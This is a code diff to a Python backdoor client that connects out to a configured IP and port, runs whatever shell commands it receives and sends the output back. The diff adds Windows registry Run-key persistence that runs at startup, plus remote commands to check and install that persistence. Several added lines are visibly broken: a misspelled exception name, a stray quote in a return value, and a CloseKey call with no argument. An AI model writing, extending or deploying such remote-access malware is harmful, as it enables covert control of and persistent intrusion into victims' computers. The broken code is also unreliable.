@@ -1,5 +1,6 @@
 import os
 import sys
+import winreg
 import shutil
 import socket
 import subprocess
@@ -64,16 +65,51 @@ def add_to_registry(file_path):
         )
 
         winreg.CloseKey(key)
-        return true 
-        
+        return True 
+
     except Exception as e:
-        return false
+        return False
+
+def check_persistence():
+    try:
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            REGISTRY_KEY_PATH,
+            0,
+            winreg.KEY_READ
+        )
+        value, _ = winreg.QueryValueEx(key, PROGRAM_NAME)
+        winreg.CloseKey()
+
+        return True
+
+    except FileNptFoundError:
+        return False
+
+    except Exception as e:
+        print(f'[-] Error checking persistence: {e}')
+        return F'alse
+
+# inicializa as configurações de persistência
+def setup_persistence():
+    try:
+        if check_persistence():
+            return 
+        
+        persistence_path = copy_to_system()
+
+        add_to_registry(persistence_path)
+
+
+    except Exception as e:
+        print("ERROR")
+
 
 def connect():
     try:
         c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         c.connect((IP, PORT))
-
+        c.send(b"[#] Client connected\n")
         return c
     except Exception as e:
         print(f'Connection error: {e}')
@@ -100,7 +136,20 @@ def cmd(c, data):
                 os.chdir(data[3:].strip())
             except Exception as e:
                 print(f'CD function error: {e}')            
-            
+            c.send("[i] Directory changed")
+            return
+
+        if data == "/check_persistence":
+            if check_persistence():
+                c.send(f"[+] Persistence status:\n\t[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_KEY_PATH}\n\t[i] Name: {PROGRAM_NAME}\n".encode())
+                return 
+            else:
+                c.send(b"[-] Persistence status: Fail")
+                return
+
+        if data == "/setup_persistence":
+            setup_persistence()
+            c.send(b"[+] Done")
             return
 
         p = subprocess.Popen(
@@ -111,8 +160,12 @@ def cmd(c, data):
             stdout=subprocess.PIPE
         )
 
-        output = p.stdout.read() + p.stderr.read() + b"\n"
-        c.send(output)
+        output = p.stdout.read() + p.stderr.read()
+        
+        if output:
+            c.send(output + b"\n")
+        else:
+            c.send(b"[+] Command executed\n")
 
     except Exception as e: 
         print(f'CMD function error: {e}')
@@ -120,6 +173,9 @@ def cmd(c, data):
 
 if __name__ == '__main__':
     try:
+
+        setup_persistence()
+
         while True:
             client = connect()
 
